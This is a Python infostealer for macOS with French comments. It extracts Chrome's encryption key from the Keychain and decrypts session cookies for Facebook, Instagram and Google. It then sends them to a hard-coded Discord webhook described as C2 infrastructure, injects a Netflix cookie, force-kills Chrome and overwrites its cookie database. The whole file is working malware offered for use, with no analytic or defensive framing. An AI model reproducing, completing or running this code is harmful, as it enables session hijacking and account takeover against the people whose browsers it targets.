import os
import sqlite3
import json
import keyring
import shutil
import requests
import subprocess
import time
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# --- SURGICAL CONFIGURATION ---
# Remplace avec ton infrastructure C2
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494109026298888273/Ynr2dafzmUxTWd2F0kJSBKeDh87L2XCmFpp48Kbc2YMx6aGNJzEqAr7MEd8CqCv0wjyy"
NETFLIX_COOKIE_VAL = "243e003a-793a-4cd6-a736-ba7f059401a5"

# Paths dynamiques pour macOS
CHROME_PATH = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Cookies")
TEMP_DB = os.path.expanduser("~/Desktop/.audit_cache.db") # Nom discret

def kill_chrome():
    """Force la fermeture de Chrome pour libérer le verrou sur la DB."""
    print("[*] Terminating Chrome processes for sync...")
    subprocess.run(["pkill", "-9", "Google Chrome"], capture_output=True)
    time.sleep(1) # Laisse le temps au système de libérer les descripteurs de fichiers

def get_encryption_key():
    """Extraction de la clé via le Keychain macOS."""
    password = keyring.get_password("Chrome Safe Storage", "Chrome")
    if not password:
        return None
    salt = b'saltysalt'
    iv = b' ' * 16
    return PBKDF2(password, salt, 16, count=1003)

def decrypt_value(enc_value, key):
    """Déchiffrement AES-CBC avec bypass du header v10."""
    try:
        cipher = AES.new(key, AES.MODE_CBC, b' ' * 16)
        decrypted = cipher.decrypt(enc_value[3:])
        # Nettoyage précis du padding PKCS7
        return decrypted[:-decrypted[-1]].decode('utf-8')
    except:
        return None

def execute_protocol():
    print(f"[*] Command Center Active. User: {os.getlogin()}")
    
    if not os.path.exists(CHROME_PATH):
        print("[!] Target Node not found.")
        return

    # 1. Bypass Lock via Shadow Copy
    shutil.copyfile(CHROME_PATH, TEMP_DB)
    conn = sqlite3.connect(TEMP_DB)
    cursor = conn.cursor()
    
    try:
        key = get_encryption_key()
        if not key:
            print("[!] Keychain Handshake Failed.")
            return

        # 2. Extract Logic (Meta & More)
        query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%' OR host_key LIKE '%instagram.com%' OR host_key LIKE '%google.com%'"
        cursor.execute(query)
        
        results = []
        for host, name, enc_val in cursor.fetchall():
            val = decrypt_value(enc_val, key)
            if val:
                results.append(f"Domain: {host} | Name: {name} | Value: {val}")

        # 3. Exfiltration Discrète
        if results:
            print(f"[+] Found {len(results)} sensitive nodes. Exfiltrating...")
            chunks = [results[i:i + 15] for i in range(0, len(results), 15)]
            for chunk in chunks:
                payload = {"content": "```" + "\n".join(chunk) + "```"}
                requests.post(DISCORD_WEBHOOK, json=payload)

       # 4. Injection Netflix (The 'Gold' Move)
        if NETFLIX_COOKIE_VAL:
            print("[*] Injecting Persistence Layer...")
            # Timestamp Chrome : Microsecondes depuis le 1er Janvier 1601
            now_ts = int((time.time() + 11644473600) * 1000000)
            expiry = 13350000000000000 # 2027+
            
            # On inclut TOUTES les colonnes critiques pour bypasser les contraintes NOT NULL
            cursor.execute("""
                INSERT OR REPLACE INTO cookies 
                (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
                VALUES (?, '.netflix.com', 'NetflixId', ?, '/', ?, 1, 1, ?, 1, 1)
            """, (now_ts, NETFLIX_COOKIE_VAL, expiry, now_ts))
            
            conn.commit()
            print("[+] Persistence Layer Active.")

    finally:
        conn.close()
        
    # 5. Final Sync (The Critical Window)
    kill_chrome() # On tue Chrome juste avant la copie finale
    try:
        shutil.copyfile(TEMP_DB, CHROME_PATH)
        os.remove(TEMP_DB)
        print("[+++] Protocol Success. Nodes Synced.")
    except Exception as e:
        print(f"[!] Sync Error: {e}")

if __name__ == "__main__":
    execute_protocol()
